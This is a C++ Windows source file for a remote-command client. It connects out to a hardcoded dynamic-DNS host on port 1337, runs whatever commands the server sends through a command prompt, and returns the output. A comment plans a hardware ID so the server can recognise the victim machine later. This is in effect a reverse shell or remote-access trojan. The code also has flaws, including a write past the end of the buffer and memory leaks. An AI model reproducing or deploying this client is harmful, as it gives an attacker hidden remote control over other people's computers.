#include "pch.h"
#include <winsock2.h>
#include <string>
#include <iostream>
#include <stdio.h>
#include <iostream>
#include <string>
#include <sstream>
#include <WS2tcpip.h>
#include "cmd-interface.h"
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)
using namespace std;
void startup_socket(string ip_address, int port, WSADATA &wsa_data, WORD &version, SOCKET &sock, sockaddr_in &socket_hint);
void connect_sock(SOCKET &socketx, sockaddr_in &socket_hint);
bool send_msg(string input);
int recv_msg(string &output);
string ipfromhost(string host);
void cout_log(string input, WORD color);
void cout_error(string input);
void cout_green(string input);
bool check_error(int status);

WSAData datas;
WORD ver = MAKEWORD(2, 2);
SOCKET sock;
sockaddr_in hint;

int main()
{
	string ip = ipfromhost("472jens.zapto.org");
	startup_socket(ip, 1337, datas, ver, sock, hint);
	connect_sock(sock, hint);
	//send over some unique hardwareid to remember computer after the server dies and to identify the socket with in the server
	for (;;) {
		string outp;
		recv_msg(outp);
	}
	closesocket(sock);
	WSACleanup();
}

void startup_socket(string ip_address, int port, WSADATA &wsa_data, WORD &version, SOCKET &sock, sockaddr_in &socket_hint) {
	auto startup_sock = WSAStartup(version, &wsa_data);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	socket_hint.sin_family = AF_INET;
	socket_hint.sin_port = htons(port);
	inet_pton(AF_INET, ip_address.c_str(), &socket_hint.sin_addr);
	if (startup_sock != 0)
	{
		cout_error("Can't start Winsock, Err #" + startup_sock);
		return;
	}
	if (sock == INVALID_SOCKET)
	{
		cout_error("Can't create socket, Err #" + WSAGetLastError());
		WSACleanup();
		return;
	}
}

int recv_msg(string &output) {
	char type[5]; // 4 + 1('\0') 
	char size[9]; // 8 + 1('\0')
	int alloc_size;
	ZeroMemory(type, 5);
	ZeroMemory(size, 9);
	if (check_error(recv(sock, type, 4, 0))) {
		string recv_type = type;
		cout << endl << "Got type: \"" << recv_type << "\"" << endl;
		if (recv_type == "TEXT") {
			if (check_error(recv(sock, size, 8, 0))) {
				alloc_size = atoi(size);
				cout << "Got size: (" << alloc_size << "):" << size << endl;
				char *input = new char[alloc_size];
				if (check_error(recv(sock, input, alloc_size, 0))) {
					input[alloc_size] = '\0';
					string output = input;
					cout << "Got text: \"" << output << "\"" << endl << endl;
					if (!(output.empty())) {
						send_msg("RECV-OK");
					}
					
				}
				else {
					return -1;
				}
			}
			else {
				return -2;
			}
		}
		else if(recv_type == "SRTU"){
			if (check_error(recv(sock, size, 8, 0))) {
				alloc_size = atoi(size);
				cout << "Got size: (" << alloc_size << "):" << size << endl;
				char *input = new char[alloc_size];
				if (check_error(recv(sock, input, alloc_size, 0))) {
					input[alloc_size] = '\0';
					string output = input;
					cout << "Got WelcomeMSG: \"" << output << "\"" << endl << endl;
					send_msg("START-OK");
				}
				else {
					return -1;
				}
			}
			else {
				return -2;
			}
		}
		else if (recv_type == "CMDA") { // send over each part of read_cmd when normal cout happens send to server with PART header
			if (check_error(recv(sock, size, 8, 0))) {
				alloc_size = atoi(size);
				cout << "Got size: (" << alloc_size << "):" << size << endl;
				char *input = new char[alloc_size];
				if (check_error(recv(sock, input, alloc_size, 0))) {
					input[alloc_size] = '\0';
					string output = input;
					cout << "Got Command: \"" << output << "\"" << endl << endl;
					cmd inter(CommandPrompt);
					string outputer;
					inter.command(output, outputer);
					inter.endme();
					send_msg(outputer);
				}
				else {
					return -1;
				}
			}
			else {
				return -2;
			}
		}
	}
	else {
		cout << "could not recv" << endl;
	}
}

bool send_msg(string input) {
	int msg_size = input.size();
	int padding = msg_size > 0 ? (int)log10((double)msg_size) + 1 : 1;
	stringstream ss;
	ss << string(8 - padding, '0') << msg_size;
	string data_size = ss.str();
	string type = "RESP";
	string data = input;
	if (!(check_error(send(sock, type.c_str(), type.size(), 0)) && check_error(send(sock, data_size.c_str(), data_size.size(), 0)) && check_error(send(sock, data.c_str(), data.size(), 0)))) {
		return false;
	}
	else {
		string outp;
		recv_msg(outp);
		return true;
	}
}

void connect_sock(SOCKET &socketx, sockaddr_in &socket_hint) {
	auto sock_connect = connect(socketx, (sockaddr*)&socket_hint, sizeof(socket_hint));
	if (sock_connect == SOCKET_ERROR) {
		cout_error("Can't connect with Socket");
		return;
	}
}

bool check_error(int status) {
	if (status == SOCKET_ERROR) {
		wchar_t *s = NULL;
		FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, WSAGetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPWSTR)&s, 0, NULL);
		wcout << "error: " << WSAGetLastError() << " | " << s << endl;
		LocalFree(s);
		return false;
	}
	else {
		return true;
	}
}

string ipfromhost(string host) {
	WSADATA wsaData;
	struct addrinfo *result = NULL;
	struct addrinfo *ptr = NULL;
	struct addrinfo hints;
	struct sockaddr_in  *sockaddr_ipv4;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	getaddrinfo(host.c_str(), NULL, &hints, &result);
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		sockaddr_ipv4 = (struct sockaddr_in *) ptr->ai_addr;
		return inet_ntoa(sockaddr_ipv4->sin_addr);
	}
	freeaddrinfo(result);
	WSACleanup();
}

void cout_log(string input, WORD color) {
	HANDLE console_handle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(console_handle, color);
	cout << "[LOG]" << input;
	SetConsoleTextAttribute(console_handle, 15);
	cout << endl;
}

void cout_error(string input) {
	HANDLE console_handle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(console_handle, 79);
	cout << endl << "[ALERT]";
	SetConsoleTextAttribute(console_handle, 15);
	cout << " " << input << endl;
}

void cout_green(string input) {
	HANDLE console_handle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(console_handle, 63);
	cout << endl << "[SERVER]";
	SetConsoleTextAttribute(console_handle, 15);
	cout << " " << input << endl;
}